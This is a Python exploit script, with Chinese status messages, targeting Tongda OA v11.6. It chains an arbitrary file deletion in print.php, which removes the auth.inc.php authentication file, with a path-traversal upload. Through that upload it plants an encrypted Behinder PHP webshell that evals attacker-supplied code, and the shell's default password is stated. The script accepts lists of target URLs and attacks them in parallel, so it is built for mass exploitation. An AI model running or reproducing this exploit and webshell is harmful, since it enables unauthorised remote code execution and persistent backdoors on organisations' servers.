import time
import argparse
import requests
import multiprocessing
import urllib3
from rich.console import Console

console = Console()
def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())

payload='''<?php
@error_reporting(0);
session_start();
    $key="e45e329feb5d925b"; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond
	$_SESSION['k']=$key;
	session_write_close();
	$post=file_get_contents("php://input");
	if(!extension_loaded('openssl'))
	{
		$t="base64_"."decode";
		$post=$t($post."");
		
		for($i=0;$i<strlen($post);$i++) {
    			 $post[$i] = $post[$i]^$key[$i+1&15]; 
    			}
	}
	else
	{
		$post=openssl_decrypt($post, "AES128", $key);
	}
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
	class C{public function __invoke($p) {eval($p."");}}
    @call_user_func(new C(),$params);
?>'''

def main(target_url):
    if target_url[:4]!='http':
        target_url = 'http://' + target_url
    if target_url[-1]!='/':
        target_url += '/'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        }    
    deleter_url=target_url+"module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php"
    console.print(now_time() + " [INFO]     正在检测通达OA v11.6 print.php 任意文件删除漏洞，删除auth.inc.php中", style='bold blue')
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(deleter_url, headers=headers,verify=False)
        response = requests.get(url=target_url+'inc/auth.inc.php', headers=headers,verify=False)
        if 'No input file specified.' not in response.text:
            console.print(now_time() + " [WARNING]  删除auth.inc.php失败", style='bold red')
        else:
            console.print(now_time() + ' [SUCCESS]  删除auth.inc.php成果，正在上传', style='bold green')
            exp_url=target_url+"/general/data_center/utils/upload.php?action=upload&filetype=nmsl&repkid=/.<>./.<>./.<>./"
            files={'FILE1': ('index123.php', payload)}
            requests.post(exp_url,files=files,verify=False)
            shell_url=target_url+'_index123.php'
            shell=requests.get(url=shell_url).text
            if 'No input file specified.' not in shell:
                console.print(now_time() + ' [SUCCESS]  上传webshell成功,冰蝎默认密码:{}'.format(shell_url), style='bold green')
            else:
                console.print(now_time() + ' [WARNING]  上传文件失败，可能漏洞利用失败', style='bold red ')
    except:
        console.print(now_time() + " [ERROR]    未知错误，或无法连接目标 ", style='bold red')
        
if __name__ == "__main__":
    try:
        parser = argparse.ArgumentParser()
        parser.add_argument('-u', '--url', dest='url', help='Target Url')
        parser.add_argument('-f', '--file', dest='file', help='Target Url File', type=argparse.FileType('r'))
        args = parser.parse_args()
        if args.file:
            pool = multiprocessing.Pool()
            for url in args.file:
                pool.apply_async(main, args=(url.strip('\n'),))
            pool.close()
            pool.join()
        elif args.url:
            main(args.url)
        else:
            print('缺少URL目标, 请使用 [-u URL] or [-f FILE]')
    except KeyboardInterrupt:
        console.print('\nCTRL+C 退出', style='reverse bold red')